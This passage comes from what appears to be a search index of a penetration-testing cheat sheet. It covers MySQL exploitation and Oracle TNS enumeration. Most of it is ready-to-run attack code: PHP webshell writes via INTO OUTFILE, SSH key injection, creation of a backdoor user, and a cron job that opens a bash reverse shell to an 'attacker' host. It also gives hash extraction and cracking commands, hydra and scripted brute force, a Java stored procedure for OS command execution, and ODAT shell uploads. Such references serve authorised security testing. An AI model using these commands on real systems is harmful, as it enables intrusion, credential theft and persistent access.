target\n</code></pre>"},{"location":"database/mysql/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"database/mysql/#file-system-access","title":"File System Access","text":""},{"location":"database/mysql/#reading-files-if-file-privilege-exists","title":"Reading Files (if FILE privilege exists)","text":"<pre><code>-- Read local files\nSELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/etc/hosts');\nSELECT LOAD_FILE('/var/log/mysql/error.log');\n\n-- Read configuration files\nSELECT LOAD_FILE('/etc/mysql/mysql.conf.d/mysqld.cnf');\nSELECT LOAD_FILE('/etc/my.cnf');\n</code></pre>"},{"location":"database/mysql/#writing-files-if-file-privilege-exists","title":"Writing Files (if FILE privilege exists)","text":"<pre><code>-- Write to files\nSELECT 'PHP webshell content' INTO OUTFILE '/var/www/html/shell.php';\n\n-- Create webshell\nSELECT '&lt;?php system($_GET[\"cmd\"]); ?&gt;' INTO OUTFILE '/var/www/html/cmd.php';\n\n-- Write SSH keys\nSELECT 'ssh-rsa AAAAB3...' INTO OUTFILE '/home/user/.ssh/authorized_keys';\n</code></pre>"},{"location":"database/mysql/#user-defined-functions-udf","title":"User Defined Functions (UDF)","text":""},{"location":"database/mysql/#system-command-execution","title":"System Command Execution","text":"<pre><code>-- Check for UDF functions\nSELECT * FROM mysql.func;\n\n-- Create UDF for command execution (if privileges allow)\nCREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';\n\n-- Execute system commands\nSELECT sys_exec('whoami');\nSELECT sys_exec('id');\n</code></pre>"},{"location":"database/mysql/#information-disclosure","title":"Information Disclosure","text":""},{"location":"database/mysql/#hash-extraction","title":"Hash Extraction","text":"<pre><code>-- Extract password hashes\nSELECT User, authentication_string FROM mysql.user;\n\n-- MySQL 5.x hash format\nSELECT User, Password FROM mysql.user;\n\n-- Extract to file\nSELECT User, authentication_string FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';\n</code></pre>"},{"location":"database/mysql/#sensitive-data-discovery_1","title":"Sensitive Data Discovery","text":"<pre><code>-- Search for common sensitive tables\nSELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES \nWHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%admin%' \nOR TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%login%';\n\n-- Search for email addresses\nSELECT * FROM information_schema.COLUMNS \nWHERE COLUMN_NAME LIKE '%email%' OR COLUMN_NAME LIKE '%mail%';\n\n-- Search for password fields\nSELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS \nWHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%pwd%';\n</code></pre>"},{"location":"database/mysql/#configuration-analysis","title":"Configuration Analysis","text":""},{"location":"database/mysql/#dangerous-mysql-settings","title":"Dangerous MySQL Settings","text":""},{"location":"database/mysql/#security-relevant-configuration","title":"Security-Relevant Configuration","text":"<pre><code>-- Check dangerous settings\nSHOW VARIABLES LIKE 'secure_file_priv';    -- File access restrictions\nSHOW VARIABLES LIKE 'local_infile';        -- LOCAL INFILE enabled\nSHOW VARIABLES LIKE 'general_log%';        -- Query logging\nSHOW VARIABLES LIKE 'log_bin%';            -- Binary logging\n\n-- Check SSL configuration\nSHOW VARIABLES LIKE '%ssl%';\n\n-- Check authentication methods\nSHOW VARIABLES LIKE 'default_authentication_plugin';\n</code></pre>"},{"location":"database/mysql/#network-configuration","title":"Network Configuration","text":"<pre><code>-- Check bind address\nSHOW VARIABLES LIKE 'bind_address';\n\n-- Check port configuration\nSHOW VARIABLES LIKE 'port';\n\n-- Check max connections\nSHOW VARIABLES LIKE 'max_connections';\n</code></pre>"},{"location":"database/mysql/#log-analysis","title":"Log Analysis","text":"<pre><code>-- Enable general log (if privileges allow)\nSET GLOBAL general_log = 'ON';\nSET GLOBAL general_log_file = '/var/log/mysql/general.log';\n\n-- Check log settings\nSHOW VARIABLES LIKE '%log%';\n\n-- View error log location\nSHOW VARIABLES LIKE 'log_error';\n</code></pre>"},{"location":"database/mysql/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"database/mysql/#weak-authentication","title":"Weak Authentication","text":"<pre><code># VULNERABILITY: Empty root password\nmysql -u root -h target\n# Successful connection without password\n\n# VULNERABILITY: Default credentials\nmysql -u root -proot -h target\nmysql -u admin -padmin -h target\n</code></pre>"},{"location":"database/mysql/#network-exposure","title":"Network Exposure","text":"<pre><code># VULNERABILITY: MySQL accessible from external networks\nnmap -p 3306 --open target_range\n\n# Check bind address configuration\nmysql -u user -ppass -h target -e \"SHOW VARIABLES LIKE 'bind_address';\"\n# Result: bind_address = 0.0.0.0 (VULNERABLE)\n</code></pre>"},{"location":"database/mysql/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>-- VULNERABILITY: Excessive user privileges\nSHOW GRANTS FOR 'user'@'%';\n-- Result: GRANT ALL PRIVILEGES ON *.* TO 'user'@'%'\n\n-- VULNERABILITY: FILE privilege\nSELECT User, File_priv FROM mysql.user WHERE File_priv = 'Y';\n</code></pre>"},{"location":"database/mysql/#information-disclosure_1","title":"Information Disclosure","text":"<pre><code>-- VULNERABILITY: Sensitive data in plain text\nSELECT * FROM users WHERE password IS NOT NULL;\n\n-- VULNERABILITY: Detailed error messages\n-- Enable sql_warnings for verbose output\nSET sql_warnings = 1;\n</code></pre>"},{"location":"database/mysql/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"database/mysql/#discovery","title":"Discovery","text":"<pre><code>nmap -p 3306 --script=mysql-info target\nnmap -p 3306 --script=mysql-empty-password target\nhydra -L users.txt -P passwords.txt mysql://target\n</code></pre>"},{"location":"database/mysql/#connection","title":"Connection","text":"<pre><code>mysql -u root -ppassword -h target\nmysql -u user -h target -e \"SHOW DATABASES;\"\n</code></pre>"},{"location":"database/mysql/#enumeration","title":"Enumeration","text":"<pre><code>SHOW DATABASES;\nUSE database_name;\nSHOW TABLES;\nSELECT * FROM mysql.user;\n</code></pre>"},{"location":"database/mysql/#data-extraction","title":"Data Extraction","text":"<pre><code>SELECT User, authentication_string FROM mysql.user;\nSELECT * FROM information_schema.TABLES;\nSELECT LOAD_FILE('/etc/passwd');\n</code></pre>"},{"location":"database/mysql/#testing-checklist","title":"Testing Checklist","text":""},{"location":"database/mysql/#discovery-detection","title":"Discovery &amp; Detection","text":"<ul> <li> Port 3306/33060 open and accessible</li> <li> MySQL version identification</li> <li> SSL/TLS configuration assessment</li> <li> Network accessibility verification</li> </ul>"},{"location":"database/mysql/#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Default credential testing</li> <li> Empty password verification</li> <li> Brute force attacks (rate-limited)</li> <li> Authentication method analysis</li> </ul>"},{"location":"database/mysql/#database-enumeration","title":"Database Enumeration","text":"<ul> <li> Database listing and access</li> <li> Table structure discovery</li> <li> User and privilege enumeration</li> <li> Sensitive data identification</li> </ul>"},{"location":"database/mysql/#configuration-assessment","title":"Configuration Assessment","text":"<ul> <li> Dangerous setting identification</li> <li> File privilege verification</li> <li> Network binding analysis</li> <li> Logging configuration review</li> </ul>"},{"location":"database/mysql/#data-extraction_1","title":"Data Extraction","text":"<ul> <li> Password hash extraction</li> <li> Sensitive table discovery</li> <li> File system access testing</li> <li> UDF capability assessment</li> </ul>"},{"location":"database/mysql/#critical-security-issues","title":"Critical Security Issues","text":""},{"location":"database/mysql/#emptydefault-passwords","title":"Empty/Default Passwords","text":"<ul> <li>Impact: Unauthorized database access, data theft</li> <li>Detection: Successful login without/with default credentials</li> <li>Exploitation: <code>mysql -u root -h target</code></li> </ul>"},{"location":"database/mysql/#network-exposure_1","title":"Network Exposure","text":"<ul> <li>Impact: External database access, increased attack surface</li> <li>Detection: Port 3306 accessible from external networks</li> <li>Exploitation: Remote connection and enumeration</li> </ul>"},{"location":"database/mysql/#excessive-privileges","title":"Excessive Privileges","text":"<ul> <li>Impact: Privilege escalation, system compromise</li> <li>Detection: Users with FILE or excessive privileges</li> <li>Exploitation: File system access, UDF exploitation</li> </ul>"},{"location":"database/mysql/#information-disclosure_2","title":"Information Disclosure","text":"<ul> <li>Impact: Sensitive data exposure, credential harvesting</li> <li>Detection: Accessible sensitive databases/tables</li> <li>Exploitation: Customer data, user credentials extraction</li> </ul>"},{"location":"database/mysql/#file-system-access_1","title":"File System Access","text":"<ul> <li>Impact: Local file read/write, web shell deployment</li> <li>Detection: FILE privilege on user accounts</li> <li>Exploitation: <code>SELECT LOAD_FILE('/etc/passwd')</code></li> </ul>"},{"location":"database/mysql/#common-mysql-databases","title":"Common MySQL Databases","text":""},{"location":"database/mysql/#system-databases","title":"System Databases","text":"<pre><code>information_schema - Metadata about databases and tables\nmysql             - User accounts and privileges\nperformance_schema - Performance monitoring data\nsys               - Performance schema views and procedures\n</code></pre>"},{"location":"database/mysql/#application-databases","title":"Application Databases","text":"<pre><code>wordpress         - WordPress CMS database\njoomla           - Joomla CMS database\ndrupal           - Drupal CMS database\nphpmyadmin       - phpMyAdmin configuration\nroundcube        - Roundcube webmail database\n</code></pre>"},{"location":"database/mysql/#default-credentials-list","title":"Default Credentials List","text":""},{"location":"database/mysql/#common-mysql-defaults","title":"Common MySQL Defaults","text":"<pre><code>root:(empty)\nroot:root\nroot:admin\nroot:password\nadmin:admin\nmysql:mysql\ntest:test\nuser:user\nguest:(empty)\n</code></pre>"},{"location":"database/mysql/#application-specific","title":"Application-Specific","text":"<pre><code>wordpress:wordpress\njoomla:joomla\ndrupal:drupal\nphpmyadmin:phpmyadmin\nxampp:xampp\nwamp:wamp\n</code></pre>"},{"location":"database/mysql/#advanced-exploitation","title":"Advanced Exploitation","text":""},{"location":"database/mysql/#hash-cracking","title":"Hash Cracking","text":"<pre><code># Extract MySQL hashes\nmysql -u root -ppass -h target -e \"SELECT User, authentication_string FROM mysql.user;\" &gt; hashes.txt\n\n# Crack with hashcat\nhashcat -m 300 hashes.txt wordlist.txt    # MySQL 5.x\nhashcat -m 7401 hashes.txt wordlist.txt   # MySQL 8.x\n</code></pre>"},{"location":"database/mysql/#post-exploitation","title":"Post-Exploitation","text":"<pre><code>-- Create backdoor user\nCREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';\nGRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';\nFLUSH PRIVILEGES;\n\n-- Enable remote access\nUPDATE mysql.user SET Host='%' WHERE User='root';\nFLUSH PRIVILEGES;\n\n-- Persistence via startup\nINSERT INTO mysql.general_log VALUES (NOW(), 'backdoor', 'localhost', 1, 'Connect', 'root', 0, '');\n</code></pre>"},{"location":"database/mysql/#file-system-exploitation","title":"File System Exploitation","text":"<pre><code>-- Web shell deployment\nSELECT '&lt;?php system($_GET[\"c\"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php';\n\n-- SSH key injection\nSELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAA...' INTO OUTFILE '/home/user/.ssh/authorized_keys';\n\n-- Cron job persistence\nSELECT '* * * * * /bin/bash -c \"bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1\"' INTO OUTFILE '/etc/cron.d/backdoor';\n</code></pre>"},{"location":"database/oracle-tns/","title":"Oracle TNS Enumeration Cheat Sheet","text":""},{"location":"database/oracle-tns/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Service Detection</li> <li>SID Enumeration</li> <li>Authentication Testing</li> <li>Database Interaction</li> <li>Manual Interaction</li> <li>SQLPlus Connection</li> <li>Oracle SQL Commands</li> <li>System Information Queries</li> <li>Credential Attacks</li> <li>Advanced Techniques</li> <li>ODAT Framework</li> <li>Common Vulnerabilities</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Security Issues</li> </ol>"},{"location":"database/oracle-tns/#overview","title":"Overview","text":"<p>Oracle TNS (Transparent Network Substrate) is Oracle's proprietary networking technology that enables communication between Oracle databases and client applications. TNS serves as the foundation for Oracle Net Services and handles connection management, load balancing, and security for Oracle database connections.</p>"},{"location":"database/oracle-tns/#key-functions","title":"Key Functions","text":"<ul> <li>Connection Management: Handles client-to-database connections</li> <li>Load Balancing: Distributes connections across multiple database instances</li> <li>Security: Provides encryption and authentication mechanisms</li> <li>Name Resolution: Resolves service names to network addresses</li> <li>Protocol Support: Supports TCP/IP, UDP, IPX/SPX protocols</li> </ul>"},{"location":"database/oracle-tns/#why-oracle-tns-matters-in-pentesting","title":"Why Oracle TNS Matters in Pentesting","text":"<ul> <li>Enterprise Databases: Often contains sensitive business-critical data</li> <li>Weak Authentication: Default accounts with known passwords</li> <li>Privilege Escalation: Database access can lead to system compromise</li> <li>File System Access: Oracle utilities allow file operations</li> <li>Network Exposure: Database services accessible from network</li> </ul>"},{"location":"database/oracle-tns/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>SID Enumeration: Discovering database instance identifiers</li> <li>Default Credentials: Oracle default accounts and passwords</li> <li>SQL Injection: Exploiting database queries and procedures</li> <li>File Upload: Uploading web shells through database utilities</li> <li>Privilege Escalation: Gaining SYSDBA privileges</li> </ul>"},{"location":"database/oracle-tns/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>1521/tcp - Oracle TNS Listener (default)\n1522-1529/tcp - Alternative TNS ports\n1630/tcp - Oracle Connection Manager\n</code></pre>"},{"location":"database/oracle-tns/#oracle-components","title":"Oracle Components","text":"Component Port Purpose Security Notes TNS Listener 1521/tcp Database connections Primary attack target Oracle EM 1158/tcp Enterprise Manager Web management interface Oracle XDB 8080/tcp XML DB HTTP Web-based database access"},{"location":"database/oracle-tns/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan for Oracle TNS\nnmap -p 1521,1522-1529 --open -sV target\n\n# Oracle-specific scripts\nnmap -p 1521 --script=oracle-* target\n\n# TNS version detection\nnmap -p 1521 -sV --script=oracle-tns-version target\n</code></pre>"},{"location":"database/oracle-tns/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"database/oracle-tns/#1-service-detection","title":"1. Service Detection","text":""},{"location":"database/oracle-tns/#basic-oracle-tns-detection","title":"Basic Oracle TNS Detection","text":"<pre><code># Standard port scan\nnmap -p 1521 -sV target\n\n# TNS version information\nnmap -p 1521 --script=oracle-tns-version target\n\n# Comprehensive Oracle scan\nnmap -p 1521 --script=oracle-enum-users,oracle-sid-brute target\n</code></pre>"},{"location":"database/oracle-tns/#alternative-port-discovery","title":"Alternative Port Discovery","text":"<pre><code># Scan common Oracle ports\nnmap -p 1521-1529,1630,8080 --open -sV target\n\n# UDP TNS listener discovery\nnmap -sU -p 1521 target\n</code></pre>"},{"location":"database/oracle-tns/#2-sid-enumeration","title":"2. SID Enumeration","text":""},{"location":"database/oracle-tns/#nmap-sid-brute-force","title":"Nmap SID Brute Force","text":"<pre><code># Default SID enumeration\nnmap -p 1521 --script=oracle-sid-brute target\n\n# Custom SID wordlist\nnmap -p 1521 --script=oracle-sid-brute --script-args oracle-sid-brute.sid=wordlist.txt target\n\n# Aggressive SID enumeration\nnmap -p 1521 --script=oracle-sid-brute --script-args oracle-sid-brute.aggressive=true target\n</code></pre>"},{"location":"database/oracle-tns/#odat-sid-discovery","title":"ODAT SID Discovery","text":"<pre><code># SID guessing with ODAT\n./odat.py sidguesser -s target\n\n# SID guessing with custom wordlist\n./odat.py sidguesser -s target --sids-file wordlists/sid.txt\n\n# Verbose SID enumeration\n./odat.py sidguesser -s target -v\n</code></pre>"},{"location":"database/oracle-tns/#manual-sid-testing","title":"Manual SID Testing","text":"<pre><code># Common Oracle SIDs to test\nSIDs=\"XE ORCL PLSExtProc XEXDB\"\n\nfor sid in $SIDs; do\n    echo \"Testing SID: $sid\"\n    sqlplus system/manager@target:1521/$sid\ndone\n</code></pre>"},{"location":"database/oracle-tns/#3-authentication-testing","title":"3. Authentication Testing","text":""},{"location":"database/oracle-tns/#default-credentials-testing","title":"Default Credentials Testing","text":"<pre><code># Common Oracle default accounts\nsqlplus system/manager@target:1521/XE\nsqlplus sys/change_on_install@target:1521/XE as sysdba\nsqlplus scott/tiger@target:1521/XE\nsqlplus hr/hr@target:1521/XE\nsqlplus dbsnmp/dbsnmp@target:1521/XE\n\n# Test without specifying SID (uses default)\nsqlplus system/manager@target:1521\n</code></pre>"},{"location":"database/oracle-tns/#odat-password-attacks","title":"ODAT Password Attacks","text":"<pre><code># Password guessing for specific user\n./odat.py passwordguesser -s target -d XE -U scott\n\n# Brute force multiple users\n./odat.py passwordguesser -s target -d XE --accounts-file accounts.txt\n\n# Custom password list\n./odat.py passwordguesser -s target -d XE -U system --passwords-file passwords.txt\n</code></pre>"},{"location":"database/oracle-tns/#4-database-interaction","title":"4. Database Interaction","text":""},{"location":"database/oracle-tns/#basic-connection","title":"Basic Connection","text":"<pre><code># Connect with discovered credentials\nsqlplus scott/tiger@target:1521/XE\n\n# Connect as SYSDBA\nsqlplus scott/tiger@target:1521/XE as sysdba\n\n# Connect using TNS alias\nsqlplus scott/tiger@target\n</code></pre>"},{"location":"database/oracle-tns/#information-gathering","title":"Information Gathering","text":"<pre><code>-- Database version\nSELECT * FROM v$version;\n\n-- Current user privileges\nSELECT * FROM user_role_privs;\n\n-- System information\nSELECT * FROM v$instance;\n\n-- Database name\nSELECT name FROM v$database;\n</code></pre>"},{"location":"database/oracle-tns/#manual-interaction","title":"Manual Interaction","text":""},{"location":"database/oracle-tns/#sqlplus-connection","title":"SQLPlus Connection","text":""},{"location":"database/oracle-tns/#connection-syntax","title":"Connection Syntax","text":"<pre><code># Standard connection\nsqlplus username/password@host:port/SID\n\n# SYSDBA connection\nsqlplus username/password@host:port/SID as sysdba\n\n# Local connection (if on same machine)\nsqlplus username/password\n\n# Connection with specific role\nsqlplus username/password@host:port/SID as sysoper\n</code></pre>"},{"location":"database/oracle-tns/#connection-troubleshooting","title":"Connection Troubleshooting","text":"<pre><code># Fix library path issues\nexport LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH\nexport PATH=$LD_LIBRARY_PATH:$PATH\n\n# Configure TNS_ADMIN\nexport TNS_ADMIN=/opt/oracle/instantclient_21_4/network/admin\n\n# Test connection without authentication\nsqlplus /nolog\nSQL&gt; connect username/password@host:port/SID\n</code></pre>"},{"location":"database/oracle-tns/#oracle-sql-commands","title":"Oracle SQL Commands","text":""},{"location":"database/oracle-tns/#basic-information-queries","title":"Basic Information Queries","text":"<pre><code>-- Database version and edition\nSELECT banner FROM v$version;\n\n-- Current user information\nSELECT user FROM dual;\nSELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;\n\n-- Session information\nSELECT sys_context('USERENV', 'SESSION_USER') FROM dual;\nSELECT sys_context('USERENV', 'IP_ADDRESS') FROM dual;\n\n-- Database information\nSELECT name, created, log_mode FROM v$database;\nSELECT instance_name, host_name, status FROM v$instance;\n</code></pre>"},{"location":"database/oracle-tns/#user-and-privilege-enumeration","title":"User and Privilege Enumeration","text":"<pre><code>-- List all users\nSELECT username, account_status, created FROM dba_users;\n\n-- Current user privileges\nSELECT * FROM user_role_privs;\nSELECT * FROM user_sys_privs;\n\n-- All system privileges\nSELECT grantee, privilege FROM dba_sys_privs WHERE grantee = 'SCOTT';\n\n-- Role information\nSELECT granted_role FROM user_role_privs;\nSELECT role FROM dba_roles;\n\n-- Administrative users\nSELECT username FROM dba_users WHERE username IN ('SYS','SYSTEM','SYSMAN','DBSNMP');\n</code></pre>"},{"location":"database/oracle-tns/#system-information-queries","title":"System Information Queries","text":""},{"location":"database/oracle-tns/#database-schema-enumeration","title":"Database Schema Enumeration","text":"<pre><code>-- List all tables accessible to current user\nSELECT table_name FROM all_tables;\n\n-- List tables owned by current user\nSELECT table_name FROM user_tables;\n\n-- List all schemas/users with tables\nSELECT DISTINCT owner FROM all_tables ORDER BY owner;\n\n-- Get table structure\nDESCRIBE table_name;\nSELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'TABLE_NAME';\n</code></pre>"},{"location":"database/oracle-tns/#sensitive-data-discovery","title":"Sensitive Data Discovery","text":"<pre><code>-- Search for tables with specific names\nSELECT owner, table_name FROM all_tables WHERE table_name LIKE '%USER%';\nSELECT owner, table_name FROM all_tables WHERE table_name LIKE '%PASS%';\nSELECT owner, table_name FROM all_tables WHERE table_name LIKE '%CRED%';\n\n-- Search for columns with sensitive names\nSELECT table_name, column_name FROM all_tab_columns \nWHERE column_name LIKE '%PASS%' OR column_name LIKE '%PWD%';\n\n-- Find views\nSELECT view_name FROM all_views;\n</code></pre>"},{"location":"database/oracle-tns/#credential-attacks","title":"Credential Attacks","text":""},{"location":"database/oracle-tns/#brute-force-attacks","title":"Brute Force Attacks","text":""},{"location":"database/oracle-tns/#hydra","title":"Hydra","text":"<pre><code># Oracle TNS brute force\nhydra -L users.txt -P passwords.txt oracle-listener://target\n\n# Single user attack\nhydra -l system -P passwords.txt oracle-listener://target\n\n# Specify SID\nhydra -L users.txt -P passwords.txt oracle-listener://target:1521/XE\n</code></pre>"},{"location":"database/oracle-tns/#custom-oracle-brute-force-script","title":"Custom Oracle Brute Force Script","text":"<pre><code>#!/bin/bash\n# Oracle brute force script\n\nTARGET=$1\nSID=$2\nUSERS=(\"system\" \"sys\" \"scott\" \"hr\" \"dbsnmp\" \"oracle\")\nPASSWORDS=(\"manager\" \"change_on_install\" \"tiger\" \"hr\" \"dbsnmp\" \"oracle\" \"password\" \"admin\")\n\nfor user in \"${USERS[@]}\"; do\n    for pass in \"${PASSWORDS[@]}\"; do\n        echo \"Testing $user:$pass\"\n        echo \"SELECT 1 FROM dual;\" | sqlplus -S $user/$pass@$TARGET:1521/$SID 2&gt;/dev/null | grep -q \"^1$\" &amp;&amp; echo \"[+] Valid: $user:$pass\"\n    done\ndone\n</code></pre>"},{"location":"database/oracle-tns/#odat-comprehensive-testing","title":"ODAT Comprehensive Testing","text":"<pre><code># Test all ODAT modules\n./odat.py all -s target -d XE\n\n# Specific password guessing\n./odat.py passwordguesser -s target -d XE -U system -P passwords.txt\n\n# User enumeration\n./odat.py passwordguesser -s target -d XE --accounts-file users.txt\n</code></pre>"},{"location":"database/oracle-tns/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"database/oracle-tns/#password-hash-extraction","title":"Password Hash Extraction","text":""},{"location":"database/oracle-tns/#extract-user-hashes","title":"Extract User Hashes","text":"<pre><code>-- Oracle 10g/11g password hashes\nSELECT name, password FROM sys.user$;\n\n-- Oracle 12c+ password hashes\nSELECT name, spare4 FROM sys.user$;\n\n-- User account information\nSELECT username, password, account_status FROM dba_users;\n\n-- Extract to file (if permissions allow)\nSELECT name||':'||password FROM sys.user$;\n</code></pre>"},{"location":"database/oracle-tns/#hash-cracking","title":"Hash Cracking","text":"<pre><code># Hashcat Oracle hash cracking\nhashcat -m 3100 hashes.txt wordlist.txt    # Oracle 11g\nhashcat -m 12300 hashes.txt wordlist.txt   # Oracle 12c+\n\n# John the Ripper\njohn --format=oracle11 hashes.txt\njohn --format=oracle12c hashes.txt\n</code></pre>"},{"location":"database/oracle-tns/#file-system-operations","title":"File System Operations","text":""},{"location":"database/oracle-tns/#file-upload-via-utl_file","title":"File Upload via UTL_FILE","text":"<pre><code>-- Check UTL_FILE_DIR parameter\nSELECT value FROM v$parameter WHERE name = 'utl_file_dir';\n\n-- Create file\nDECLARE\n  f UTL_FILE.FILE_TYPE;\nBEGIN\n  f := UTL_FILE.FOPEN('/tmp', 'test.txt', 'W');\n  UTL_FILE.PUT_LINE(f, 'Test content');\n  UTL_FILE.FCLOSE(f);\nEND;\n/\n</code></pre>"},{"location":"database/oracle-tns/#odat-file-operations","title":"ODAT File Operations","text":"<pre><code># Upload file\n./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /var/www/html shell.php ./shell.php\n\n# Download file\n./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt\n\n# Check file permissions\n./odat.py utlfile -s target -d XE -U scott -P tiger --test-all\n</code></pre>"},{"location":"database/oracle-tns/#java-stored-procedures","title":"Java Stored Procedures","text":""},{"location":"database/oracle-tns/#execute-system-commands","title":"Execute System Commands","text":"<pre><code>-- Enable Java\nSELECT value FROM v$parameter WHERE name = 'java_pool_size';\n\n-- Create Java class for command execution\nCREATE OR REPLACE JAVA SOURCE NAMED \"CommandExec\" AS\nimport java.io.*;\npublic class CommandExec {\n    public static String execCmd(String cmd) {\n        try {\n            Process p = Runtime.getRuntime().exec(cmd);\n            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line;\n            StringBuilder sb = new StringBuilder();\n            while ((line = br.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n            return sb.toString();\n        } catch (Exception e) {\n            return e.getMessage();\n        }\n    }\n}\n/\n\n-- Create PL/SQL wrapper\nCREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS\nLANGUAGE JAVA NAME 'CommandExec.execCmd(java.lang.String) return java.lang.String';\n/\n\n-- Execute commands\nSELECT exec_cmd('whoami') FROM dual;\nSELECT exec_cmd('id') FROM dual;\n</code></pre>"},{"location":"database/oracle-tns/#odat-framework","title":"ODAT Framework","text":""},{"location":"database/oracle-tns/#installation-and-setup","title":"Installation and Setup","text":"<pre><code># Download Oracle Instant Client\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\n# Extract and configure\nsudo mkdir -p /opt/oracle\nsudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\nsudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\nexport LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH\n\n# Clone and setup ODAT\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\npip3 install cx_Oracle python-libnmap colorlog termcolor passlib pycryptodome\n</code></pre>"},{"location":"database/oracle-tns/#odat-module-usage","title":"ODAT Module Usage","text":""},{"location":"database/oracle-tns/#comprehensive-testing","title":"Comprehensive Testing","text":"<pre><code># Test all modules\n./odat.py all -s target -d XE -U scott -P tiger\n\n# Test specific functionality\n./odat.py all -s target -d XE -U scott -P tiger --sysdba\n\n# Verbose output\n./odat.py all -s target -d XE -U scott -P tiger -v\n</code></pre>"},{"location":"database/oracle-tns/#specific-module-testing","title":"Specific Module Testing","text":"<pre><code># SID guessing\n./odat.py sidguesser -s target\n\n# Password guessing\n./odat.py passwordguesser -s target -d XE\n\n# File operations\n./odat.py utlfile -s target -d XE -U scott -P tiger --test-all\n\n# HTTP operations\n./odat.py utlhttp -s target -d XE -U scott -P tiger --test-all\n\n# Java exploitation\n./odat.py java -s target -d XE -U scott -P tiger --test-all\n</code></pre>"},{"location":"database/oracle-tns/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"database/oracle-tns/#default-credentials","title":"Default Credentials","text":"<pre><code># VULNERABILITY: Default Oracle accounts\nsqlplus system/manager@target:1521/XE\nsqlplus scott/tiger@target:1521/XE\nsqlplus hr/hr@target:1521/XE\n\n# VULNERABILITY: Default DBSNMP account\nsqlplus dbsnmp/dbsnmp@target:1521/XE\n</code></pre>"},{"location":"database/oracle-tns/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>-- VULNERABILITY: SYSDBA access with regular account\nsqlplus scott/tiger@target:1521/XE as sysdba\n\n-- Check if successful escalation\nSELECT * FROM user_role_privs;\n-- Result shows SYS privileges instead of SCOTT\n</code></pre>"},{"location":"database/oracle-tns/#information-disclosure","title":"Information Disclosure","text":"<pre><code>-- VULNERABILITY: Access to sensitive system tables\nSELECT * FROM dba_users;\nSELECT name, password FROM sys.user$;\n\n-- VULNERABILITY: Database configuration exposure\nSELECT * FROM v$parameter;\n</code></pre>"},{"location":"database/oracle-tns/#file-system-access","title":"File System Access","text":"<pre><code># VULNERABILITY: File upload capabilities\n./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /var/www/html shell.php ./shell.php\n\n# VULNERABILITY: File download capabilities\n./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt\n</code></pre>"},{"location":"database/oracle-tns/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"database/oracle-tns/#discovery","title":"Discovery","text":"<pre><code>nmap -p 1521 --script=oracle-sid-brute target\n./odat.py sidguesser -s target\nsqlplus system/manager@target:1521/XE\n</code></pre>"},{"location":"database/oracle-tns/#authentication","title":"Authentication","text":"<pre><code>./odat.py passwordguesser -s target -d XE -U system\nhydra -L users.txt -P passwords.txt oracle-listener://target\nsqlplus scott/tiger@target:1521/XE as sysdba\n</code></pre>"},{"location":"database/oracle-tns/#enumeration","title":"Enumeration","text":"<pre><code>SELECT * FROM v$version;\nSELECT * FROM user_role_privs;\nSELECT table_name FROM all_tables;\nSELECT name, password FROM sys.user$;\n</code></pre>"},{"location":"database/oracle-tns/#file-operations","title":"File Operations","text":"<pre><code>./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /path/file.php ./file.php\n./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt\n</code></pre>"},{"location":"database/oracle-tns/#testing-checklist","title":"Testing Checklist","text":""},{"location":"database/oracle-tns/#discovery-detection","title":"Discovery &amp; Detection","text":"<ul> <li> Port 1521 open and accessible</li> <li> Oracle TNS version identification</li> <li> Alternative port discovery</li> <li> Service banner analysis</li> </ul>"},{"location":"database/oracle-tns/#sid-enumeration","title":"SID Enumeration","text":"<ul> <li> Default SID testing 